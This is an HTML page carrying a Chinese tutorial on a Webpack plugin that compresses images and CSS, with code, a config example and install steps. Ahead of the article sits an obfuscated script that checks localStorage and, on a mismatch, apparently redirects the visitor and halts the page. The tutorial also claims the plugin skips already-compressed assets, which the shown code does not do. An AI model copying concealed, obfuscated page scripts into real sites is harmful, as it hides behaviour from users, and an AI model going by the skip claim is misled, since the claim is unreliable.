<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x32de(){var s=["wxrkj1yOyW","umk2gCoUh0FdJMKGnq","f2Kcm8kyWR/cHgFcNW","W6NdUNasW5r/vH7dVqmdja","dg5EcLDJBL0/ra","qmoNxbFcQKJdKvyPfq","W67dUNyuW5X/kZVdVqa0b1K","hYynpxSftepcRW","WPBcVSosWR16bmoSFYq","qW/dPCoYW444W40MWQu","DKJcHmosFCkqgG","dg9wcef1sKmKva","WP0xW63dKspdPCoDWPejW655AG","W6VcTCkpaCkevWldPCoIW4FdHcvA","WPucW5NcU8osW5/dHci","eIacFumEvxtcJSkh","W7FcM07cN8kP","WRddUfRdTsrudLrf","W6JcTCkiE8o3kfJdVSof","zr3dLCoXW6ldG0hcImk+pmks","WRZcMapdJ8obxuldO13cKa","egydkmkCWQVcJgRcMa","W6xdQ8khWP1rmSoqCqu","W54QW57cNrddHSkbW6JcJmozmq","W6O9WQ47W4Lyk1TwbSkvWRK/","W4XrW47cO1ZcKSocWOjO","W6pcOKuDsCkdWOislmo8BNZdKCkZWPldKJRcTGGtW4VdTmkEdmk1iW","jrNdGSkJoCobr8kFq8kYWQBcLSku"];return(_0x32de=function(){return s})()}var _0x225b5c=_0x4f0c;function _0x4f0c(p,s){var t=_0x32de();return(_0x4f0c=function(s,n){var a=t[s-=494];void 0===_0x4f0c.sNCwTV&&(_0x4f0c.PIPSTU=function(s,n){var a,l=[],p=0,t="";for(s=(s=>{for(var n,a,l="",p="",t=0,e=0;a=s.charAt(e++);~a&&(n=t%4?64*n+a:a,t++%4)&&(l+=String.fromCharCode(255&n>>(-2*t&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var c=0,i=l.length;c<i;c++)p+="%"+("00"+l.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(p)})(s),e=0;e<256;e++)l[e]=e;for(e=0;e<256;e++)p=(p+l[e]+n.charCodeAt(e%n.length))%256,a=l[e],l[e]=l[p],l[p]=a;for(var e=0,p=0,c=0;c<s.length;c++)a=l[e=(e+1)%256],l[e]=l[p=(p+l[e])%256],l[p]=a,t+=String.fromCharCode(s.charCodeAt(c)^l[(l[e]+l[p])%256]);return t},p=arguments,_0x4f0c.sNCwTV=!0);var s=s+t[0],l=p[s];return l?a=l:(void 0===_0x4f0c.ACYmiJ&&(_0x4f0c.ACYmiJ=!0),a=_0x4f0c.PIPSTU(a,n),p[s]=a),a})(p,s)}if((()=>{for(var s=_0x4f0c,n=_0x32de();;)try{if(283956==-parseInt(s(512,"4P@T"))+parseInt(s(498,"g(T!"))/2*(-parseInt(s(514,"kc12"))/3)+-parseInt(s(513,"E^zd"))/4*(-parseInt(s(518,"OEUT"))/5)+-parseInt(s(496,"9xsn"))/6*(-parseInt(s(517,"#&iv"))/7)+parseInt(s(504,"L*gs"))/8*(parseInt(s(511,"&wbr"))/9)+-parseInt(s(508,"Fn14"))/10+parseInt(s(505,"sn7U"))/11)break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x225b5c(519,"Fn14")](_0x225b5c(503,"#&iv"))!=_0x225b5c(497,"JOA6"))throw window[_0x225b5c(495,"lv[$")][_0x225b5c(509,"9xsn")](_0x225b5c(507,"lMGn")),Error();document.title="Webpack 资源压缩插件实现",document.getElementById("article").innerHTML='<div><p>下面是一个实现 Webpack 资源压缩插件的完整代码，该插件可以对特定类型的资源（如图片、CSS）进行压缩优化，并支持配置压缩级别和需要处理的文件类型。</p>\n<h2>插件代码</h2>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> { <span class="hljs-title class_">Compilation</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;webpack&quot;</span>);\n<span class="hljs-keyword">const</span> imagemin = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;imagemin&quot;</span>);\n<span class="hljs-keyword">const</span> imageminMozjpeg = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;imagemin-mozjpeg&quot;</span>);\n<span class="hljs-keyword">const</span> imageminPngquant = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;imagemin-pngquant&quot;</span>);\n<span class="hljs-keyword">const</span> imageminSvgo = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;imagemin-svgo&quot;</span>);\n<span class="hljs-keyword">const</span> imageminGifsicle = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;imagemin-gifsicle&quot;</span>);\n<span class="hljs-keyword">const</span> cssnano = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;cssnano&quot;</span>);\n<span class="hljs-keyword">const</span> postcss = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;postcss&quot;</span>);\n\n<span class="hljs-keyword">class</span> <span class="hljs-title class_">ResourceCompressionPlugin</span> {\n  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options = {}</span>) {\n    <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> = {\n      <span class="hljs-attr">image</span>: {\n        <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,\n        <span class="hljs-attr">jpegQuality</span>: <span class="hljs-number">75</span>,\n        <span class="hljs-attr">pngQuality</span>: [<span class="hljs-number">0.6</span>, <span class="hljs-number">0.8</span>],\n        <span class="hljs-attr">svgoOptions</span>: {},\n        <span class="hljs-attr">gifOptimizationLevel</span>: <span class="hljs-number">1</span>,\n      },\n      <span class="hljs-attr">css</span>: {\n        <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,\n        <span class="hljs-attr">preset</span>: <span class="hljs-string">&quot;default&quot;</span>,\n      },\n      <span class="hljs-attr">fileTypes</span>: [<span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>, <span class="hljs-string">&quot;svg&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>, <span class="hljs-string">&quot;css&quot;</span>],\n      ...options,\n    };\n  }\n\n  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) {\n    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">thisCompilation</span>.<span class="hljs-title function_">tap</span>(\n      <span class="hljs-string">&quot;ResourceCompressionPlugin&quot;</span>,\n      <span class="hljs-function">(<span class="hljs-params">compilation</span>) =&gt;</span> {\n        compilation.<span class="hljs-property">hooks</span>.<span class="hljs-property">processAssets</span>.<span class="hljs-title function_">tapPromise</span>(\n          {\n            <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;ResourceCompressionPlugin&quot;</span>,\n            <span class="hljs-attr">stage</span>: <span class="hljs-title class_">Compilation</span>.<span class="hljs-property">PROCESS_ASSETS_STAGE_OPTIMIZE_SIZE</span>,\n          },\n          <span class="hljs-title function_">async</span> (assets) =&gt; {\n            <span class="hljs-keyword">const</span> processPromises = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(assets).<span class="hljs-title function_">map</span>(\n              <span class="hljs-title function_">async</span> (filename) =&gt; {\n                <span class="hljs-keyword">const</span> asset = assets[filename];\n                <span class="hljs-keyword">const</span> fileExt = filename.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;.&quot;</span>).<span class="hljs-title function_">pop</span>().<span class="hljs-title function_">toLowerCase</span>();\n\n                <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">fileTypes</span>.<span class="hljs-title function_">includes</span>(fileExt)) {\n                  <span class="hljs-keyword">return</span>;\n                }\n\n                <span class="hljs-keyword">try</span> {\n                  <span class="hljs-keyword">const</span> originalSize = asset.<span class="hljs-title function_">size</span>();\n                  <span class="hljs-keyword">let</span> compressedContent = asset.<span class="hljs-title function_">source</span>();\n\n                  <span class="hljs-comment">// 图片压缩</span>\n                  <span class="hljs-keyword">if</span> (\n                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">image</span>.<span class="hljs-property">enabled</span> &amp;&amp;\n                    [<span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>, <span class="hljs-string">&quot;svg&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>].<span class="hljs-title function_">includes</span>(fileExt)\n                  ) {\n                    <span class="hljs-keyword">const</span> plugins = [];\n\n                    <span class="hljs-keyword">if</span> ([<span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>].<span class="hljs-title function_">includes</span>(fileExt)) {\n                      plugins.<span class="hljs-title function_">push</span>(\n                        <span class="hljs-title function_">imageminMozjpeg</span>({\n                          <span class="hljs-attr">quality</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">image</span>.<span class="hljs-property">jpegQuality</span>,\n                        }),\n                      );\n                    }\n\n                    <span class="hljs-keyword">if</span> (fileExt === <span class="hljs-string">&quot;png&quot;</span>) {\n                      plugins.<span class="hljs-title function_">push</span>(\n                        <span class="hljs-title function_">imageminPngquant</span>({\n                          <span class="hljs-attr">quality</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">image</span>.<span class="hljs-property">pngQuality</span>,\n                        }),\n                      );\n                    }\n\n                    <span class="hljs-keyword">if</span> (fileExt === <span class="hljs-string">&quot;svg&quot;</span>) {\n                      plugins.<span class="hljs-title function_">push</span>(\n                        <span class="hljs-title function_">imageminSvgo</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">image</span>.<span class="hljs-property">svgoOptions</span>),\n                      );\n                    }\n\n                    <span class="hljs-keyword">if</span> (fileExt === <span class="hljs-string">&quot;gif&quot;</span>) {\n                      plugins.<span class="hljs-title function_">push</span>(\n                        <span class="hljs-title function_">imageminGifsicle</span>({\n                          <span class="hljs-attr">optimizationLevel</span>:\n                            <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">image</span>.<span class="hljs-property">gifOptimizationLevel</span>,\n                        }),\n                      );\n                    }\n\n                    compressedContent = <span class="hljs-keyword">await</span> imagemin.<span class="hljs-title function_">buffer</span>(\n                      compressedContent,\n                      { plugins },\n                    );\n                  }\n\n                  <span class="hljs-comment">// CSS压缩</span>\n                  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">css</span>.<span class="hljs-property">enabled</span> &amp;&amp; fileExt === <span class="hljs-string">&quot;css&quot;</span>) {\n                    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">postcss</span>([\n                      <span class="hljs-title function_">cssnano</span>({ <span class="hljs-attr">preset</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">css</span>.<span class="hljs-property">preset</span> }),\n                    ]).<span class="hljs-title function_">process</span>(compressedContent.<span class="hljs-title function_">toString</span>(), {\n                      <span class="hljs-attr">from</span>: <span class="hljs-literal">undefined</span>,\n                    });\n                    compressedContent = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(result.<span class="hljs-property">css</span>);\n                  }\n\n                  <span class="hljs-keyword">const</span> compressedSize = compressedContent.<span class="hljs-property">length</span>;\n                  <span class="hljs-keyword">const</span> reduction = originalSize - compressedSize;\n                  <span class="hljs-keyword">const</span> reductionPercent = (\n                    (reduction / originalSize) *\n                    <span class="hljs-number">100</span>\n                  ).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>);\n\n                  <span class="hljs-keyword">if</span> (reduction &gt; <span class="hljs-number">0</span>) {\n                    compilation.<span class="hljs-title function_">updateAsset</span>(\n                      filename,\n                      <span class="hljs-keyword">new</span> compiler.<span class="hljs-property">webpack</span>.<span class="hljs-property">sources</span>.<span class="hljs-title class_">RawSource</span>(compressedContent),\n                    );\n\n                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Compressed <span class="hljs-subst">${filename}</span>: \n                Original: <span class="hljs-subst">${(originalSize / <span class="hljs-number">1024</span>).toFixed(<span class="hljs-number">2</span>)}</span> KB, \n                Compressed: <span class="hljs-subst">${(compressedSize / <span class="hljs-number">1024</span>).toFixed(<span class="hljs-number">2</span>)}</span> KB, \n                Reduced: <span class="hljs-subst">${(reduction / <span class="hljs-number">1024</span>).toFixed(<span class="hljs-number">2</span>)}</span> KB (<span class="hljs-subst">${reductionPercent}</span>%)`</span>);\n                  }\n                } <span class="hljs-keyword">catch</span> (error) {\n                  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Error compressing <span class="hljs-subst">${filename}</span>:`</span>, error);\n                }\n              },\n            );\n\n            <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(processPromises);\n          },\n        );\n      },\n    );\n  }\n}\n\n<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title class_">ResourceCompressionPlugin</span>;\n</code></pre>\n<h2>使用示例</h2>\n<p>在 webpack 配置中使用该插件：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">ResourceCompressionPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./ResourceCompressionPlugin&quot;</span>);\n\n<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {\n  <span class="hljs-comment">// ...其他webpack配置</span>\n  <span class="hljs-attr">plugins</span>: [\n    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceCompressionPlugin</span>({\n      <span class="hljs-attr">image</span>: {\n        <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,\n        <span class="hljs-attr">jpegQuality</span>: <span class="hljs-number">80</span>, <span class="hljs-comment">// JPEG质量 (0-100)</span>\n        <span class="hljs-attr">pngQuality</span>: [<span class="hljs-number">0.65</span>, <span class="hljs-number">0.8</span>], <span class="hljs-comment">// PNG质量范围</span>\n        <span class="hljs-attr">svgoOptions</span>: {\n          <span class="hljs-attr">plugins</span>: [\n            { <span class="hljs-attr">removeViewBox</span>: <span class="hljs-literal">false</span> }, <span class="hljs-comment">// 保留viewBox属性</span>\n          ],\n        },\n        <span class="hljs-attr">gifOptimizationLevel</span>: <span class="hljs-number">2</span>, <span class="hljs-comment">// GIF优化级别 (1-3)</span>\n      },\n      <span class="hljs-attr">css</span>: {\n        <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,\n        <span class="hljs-attr">preset</span>: <span class="hljs-string">&quot;advanced&quot;</span>, <span class="hljs-comment">// cssnano预设</span>\n      },\n      <span class="hljs-attr">fileTypes</span>: [<span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>, <span class="hljs-string">&quot;svg&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>, <span class="hljs-string">&quot;css&quot;</span>], <span class="hljs-comment">// 要处理的文件类型</span>\n    }),\n  ],\n};\n</code></pre>\n<h2>功能说明</h2>\n<ol>\n<li>\n<p><strong>图片压缩</strong>   ：</p>\n<ul>\n<li>JPEG: 使用 mozjpeg 进行压缩，可配置质量</li>\n<li>PNG: 使用 pngquant 进行压缩，可配置质量范围</li>\n<li>SVG: 使用 svgo 进行优化，可配置选项</li>\n<li>GIF: 使用 gifsicle 进行优化，可配置优化级别</li>\n</ul>\n</li>\n<li>\n<p><strong>CSS压缩</strong>   ：</p>\n<ul>\n<li>使用 cssnano 进行压缩</li>\n<li>支持不同的预设级别 (\'default\' | \'advanced\' | \'lite\')</li>\n</ul>\n</li>\n<li>\n<p><strong>详细日志</strong>   ：</p>\n<ul>\n<li>显示每个文件的压缩前后大小对比</li>\n<li>显示节省的空间大小和百分比</li>\n</ul>\n</li>\n<li>\n<p><strong>高度可配置</strong>   ：</p>\n<ul>\n<li>可以单独启用/禁用图片或CSS压缩</li>\n<li>可以自定义每种文件类型的压缩参数</li>\n<li>可以指定要处理的文件类型</li>\n</ul>\n</li>\n</ol>\n<h2>安装依赖</h2>\n<p>在使用前需要安装相关依赖：</p>\n<pre><code class="language-bash">npm install imagemin imagemin-mozjpeg imagemin-pngquant imagemin-svgo imagemin-gifsicle cssnano postcss --save-dev\n</code></pre>\n<h2>注意事项</h2>\n<ol>\n<li>插件会在资源优化阶段进行处理，确保在最终输出前完成压缩</li>\n<li>对于已经压缩过的资源，插件会跳过或减少压缩强度以避免质量损失</li>\n<li>可以通过调整压缩参数在文件大小和输出质量之间取得平衡</li>\n<li>生产环境建议启用此插件，开发环境可根据需要禁用</li>\n</ol>\n<p>这个插件可以帮助开发者显著减少最终打包资源的体积，提高页面加载速度，同时保持可接受的资源质量。</p>\n</div>'</script></body></html>